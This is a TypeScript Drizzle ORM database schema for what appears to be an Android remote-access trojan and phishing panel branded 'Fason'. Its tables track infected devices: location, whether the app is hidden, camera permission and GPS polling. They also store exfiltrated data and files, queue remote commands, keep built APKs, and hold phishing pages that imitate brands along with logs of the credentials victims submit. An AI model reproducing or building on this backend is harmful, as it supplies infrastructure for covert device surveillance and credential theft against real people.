import { sqliteTable, text, integer, blob, uniqueIndex } from 'drizzle-orm/sqlite-core';
import { sql } from 'drizzle-orm';

export const user = sqliteTable('user', {
  id: text('id').primaryKey(),
  email: text('email').notNull().unique(),
  emailVerified: integer('email_verified', { mode: 'boolean' }).notNull().default(false),
  name: text('name').notNull(),
  image: text('image'),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  role: text('role').notNull().default('user'),
  banned: integer('banned', { mode: 'boolean' }).default(false),
  banReason: text('ban_reason'),
  banExpires: integer('ban_expires', { mode: 'timestamp' }),
  username: text('username').notNull().default(''),
  permissions: text('permissions').notNull().default('[]'),
  isDefault: integer('is_default').default(0),
  lastLogin: integer('last_login', { mode: 'timestamp' }),
  deviceSecret: text('device_secret'),
});
export const session = sqliteTable('session', {
  id: text('id').primaryKey(),
  userId: text('user_id').notNull().references(() => user.id, { onDelete: 'cascade' }),
  expiresAt: integer('expires_at', { mode: 'timestamp' }).notNull(),
  token: text('token').notNull().unique(),
  ipAddress: text('ip_address'),
  userAgent: text('user_agent'),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  impersonatedBy: text('impersonated_by'),
});
export const account = sqliteTable('account', {
  id: text('id').primaryKey(),
  providerId: text('provider_id').notNull(),
  accountId: text('account_id').notNull(),
  userId: text('user_id').notNull().references(() => user.id, { onDelete: 'cascade' }),
  accessToken: text('access_token'),
  refreshToken: text('refresh_token'),
  idToken: text('id_token'),
  accessTokenExpiresAt: integer('access_token_expires_at', { mode: 'timestamp' }),
  refreshTokenExpiresAt: integer('refresh_token_expires_at', { mode: 'timestamp' }),
  scope: text('scope'),
  password: text('password'),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
});
export const verification = sqliteTable('verification', {
  id: text('id').primaryKey(),
  value: text('value').notNull(),
  expiresAt: integer('expires_at', { mode: 'timestamp' }).notNull(),
  identifier: text('identifier').notNull(),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
});
export const clients = sqliteTable('clients', {
  id: text('id').primaryKey(),
  ownerId: text('owner_id'),
  ip: text('ip').default(''),
  country: text('country'),
  city: text('city'),
  timezone: text('timezone'),
  firstSeen: text('first_seen').$defaultFn(() => new Date().toISOString()),
  lastSeen: text('last_seen').$defaultFn(() => new Date().toISOString()),
  online: integer('online', { mode: 'boolean' }).default(false),
  reconnectCount: integer('reconnect_count').default(0),
  deviceModel: text('device_model'),
  deviceBrand: text('device_brand'),
  deviceVersion: text('device_version'),
  fasonHidden: integer('fason_hidden', { mode: 'boolean' }).default(false),
  cameraPermission: integer('camera_permission', { mode: 'boolean' }).default(false),
  currentPath: text('current_path').default(''),
  gpsInterval: integer('gps_interval').default(0),
  deviceInfo: text('device_info'),
});
export const clientData = sqliteTable('client_data', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  dataType: text('data_type').notNull(),
  data: text('data').default('[]'),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
}, (table) => [
  uniqueIndex('idx_client_data_unique').on(table.clientId, table.dataType),
]);
export const clientFiles = sqliteTable('client_files', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  fileType: text('file_type').notNull(),
  originalName: text('original_name').notNull(),
  mimeType: text('mime_type'),
  data: blob('data').notNull(),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});
export const logs = sqliteTable('logs', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  type: text('type').notNull().default('INFO'),
  category: text('category').notNull().default('SYSTEM'),
  message: text('message').notNull(),
  details: text('details'),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});
export const buildRecords = sqliteTable('build_records', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  userId: text('user_id'),
  serverUrl: text('server_url').notNull(),
  homePageUrl: text('home_page_url').notNull(),
  appName: text('app_name').notNull().default('Fason'),
  status: text('status', { enum: ['completed', 'failed'] }).default('completed'),
  apkData: blob('apk_data'),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
  completedAt: text('completed_at'),
});
export const phishingPages = sqliteTable('phishing_pages', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  slug: text('slug').notNull().unique(),
  brand: text('brand').notNull(),
  category: text('category').notNull(),
  variant: text('variant').notNull(),
  title: text('title').notNull(),
  html: text('html').notNull(),
  hits: integer('hits').notNull().default(0),
  enabled: integer('enabled').notNull().default(1),
  createdBy: text('created_by'),
  createdAt: text('created_at').notNull().default(sql`(datetime('now'))`),
});

export const phishingLogs = sqliteTable('phishing_logs', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  pageId: integer('page_id').references(() => phishingPages.id, { onDelete: 'cascade' }),
  slug: text('slug').notNull(),
  brand: text('brand').notNull(),
  variant: text('variant').notNull(),
  ip: text('ip').notNull().default(''),
  userAgent: text('user_agent').notNull().default(''),
  fields: text('fields').notNull().default('{}'),
  meta: text('meta').notNull().default('{}'),
  createdAt: text('created_at').notNull().default(sql`(datetime('now'))`),
});

export const settings = sqliteTable('settings', {
  key: text('key').primaryKey(),
  value: text('value').notNull(),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
});
export const loginAttempts = sqliteTable('login_attempts', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  ip: text('ip').notNull(),
  identifier: text('identifier').notNull().default(''),
  attemptedAt: text('attempted_at').notNull().$defaultFn(() => new Date().toISOString()),
});
export const commands = sqliteTable('commands', {
  id: text('id').primaryKey(),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  cmdType: text('cmd_type').notNull(),
  params: text('params').default('{}'),
  status: text('status', { enum: ['sent', 'delivered', 'responded', 'failed'] }).notNull().default('sent'),
  sentAt: text('sent_at').notNull().$defaultFn(() => new Date().toISOString()),
  deliveredAt: text('delivered_at'),
  respondedAt: text('responded_at'),
  responseSummary: text('response_summary'),
});
export const jwtSecret = sqliteTable('jwt_secret', {
  id: integer('id').primaryKey(),
  secret: text('secret').notNull(),
});
